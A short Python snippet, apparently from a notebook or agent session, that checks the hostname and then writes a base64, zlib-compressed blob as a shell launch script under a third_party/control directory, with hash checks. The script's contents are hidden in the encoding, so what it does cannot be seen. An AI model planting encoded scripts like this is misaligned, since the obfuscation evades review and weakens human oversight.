from pathlib import Path
import socket, base64, hashlib, json, zlib
assert socket.gethostname() == 'shu-common-25721452-notebook-qx2k0r-0'
p = Path('/home/jovyan/adapointr_work/PoinTr/third_party/bcsp_scq_rf_sixmodel_prediction_20261115_v1/control/native_prediction_launch_once_v1.sh')
assert p.parent.is_dir() and (not p.exists()) and (not any((x.is_symlink() for x in (p, *p.parents))))
b = zlib.decompress(base64.b64decode('eNrFlluT2jYUx9/9KZRt2peO15bvZMbpGDCLZwFTzCbNtB2NbEngrG+Rbcp28uErsxAg2U4vmSUvjNC56Pc/54yl714ocVooMa7XUk0bINNWanNc3wPVtqWEAGVd5lR5X24ecKFggqsyLRqO/ij5vTIX6yWXfgUvgDx59AS/g48fAd2mDYAaPDPtk/yzx2fH/OeAPdf/jVOyclV/VbCScFykOENxUleItVmW4zzGz5FTiQY/o8UI1ek2LwnNUIGbdEMRoRualVVOiwZpqmZBCE20gZ8h5Pck5UCugCx/JcchlXxZPRLdViVvwOBu6KE3QRT0Jz4a+m+CgR+5N/M7WXd0AqGDZd1yErlnUF2GloXlBBOdMhw7jNjHJP2JF6G34eI2mnsDHw3C2Si4cV8Zas965Rzcwukcze6maDle+N4wcrWDYXo7edoQzv3ZLvWT1vm75TicDcPZ8u0iWPr9d0t/EA5995O46XzS9wa3/mzoeqvVye4j3zBYuBctupJXWVIWLF2dlX/gDcai+EHkiSYc6ZfT+eUJm7w6L+/Yi8aR7w9d9bA/HqHxXR+Fo9EkmJ3yLrxZNAoXU38RfWntosKpf2E5a4YSnKzpgeKX4c2+3N8A5oxkKUY2nH3q/cX7zNOmLPbF6e6vH6mktDXfXWpNmtOyFXeaXKerAmfu0l9Mxb/7NMtkzBrKXbMGtqaqNVDKqlHEUBOs0GJTH8nlR64uX/XQrMtCv4YqkAMgR0Du/5uvXbNOOUEV5s2DslNbJx8QZ0eNFackTZpUCDnV9qTvvh77EOF2XT0ISZx+aGndPCfO33TmxJtuadLuVnucDu99XRZHQLleY820QGyqemw4NtUo0bGqxpZqqCrTqA2TnoM1Ylo9HZKYMM3Ets2Y3pns2GAMUtOCIiNuRTd4+ifuTnxO4WIqGl5mypeCzxBOxJ7tHySbFmUa6dkqM2PdMVToiAIQIceOYwfqpAcpM2LDYrBbQYNAMdXCZFtGQrDR64rYFt1Mfxux+8NPe/q4cxBoi1/T1nBPtRwSq6ZQG0NDs6GjMdOhWkwMYmkU25ZmMDV2LI2olqknum7o1IAWeH3Zb0eG2yJZX4uMQHv9A5R44r78af8Ilioujmbg6vv6t+IKXL3kydWl+bpXGkqE53WzbaTdm23HIf0Fo+kTdw=='))
assert hashlib.sha256(b).hexdigest() == '63c220e6f99e5d49039a455c065fc362cfae748e455cce186b302398706c8292'
with p.open('xb') as f:
    f.write(b)
assert hashlib.sha256(p.read_bytes()).hexdigest() == '63c220e6f99e5d49039a455c065fc362cfae748e455cce186b302398706c8292'
print(json.dumps(dict(status='EXCLUSIVE_CONTROL_HASH_PASS', bytes=len(b))))